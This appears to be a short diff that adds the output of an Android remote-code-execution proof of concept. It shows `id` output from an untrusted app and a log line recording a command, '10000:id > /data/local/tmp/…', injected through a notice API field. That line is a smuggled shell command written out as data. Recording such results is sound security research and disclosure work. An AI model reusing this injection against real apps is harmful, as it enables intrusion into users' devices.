@@ -1,0 +1,2 @@
+uid=10355(u0_a355) gid=10355(u0_a355) groups=10355(u0_a355),3003(inet),9997(everybody),20355(u0_a355_cache),50355(all_a355) context=u:r:untrusted_app_27:s0:c99,c257,c512,c768
+11-05 15:24:53.760 I/FLRcePoC(22450): INJECT notice @ https://notice.api.fakeloc.cc:4430/Notice/getNotices -> 10000:id > /data/local/tmp/poc_notice_sh.txt 2>&1
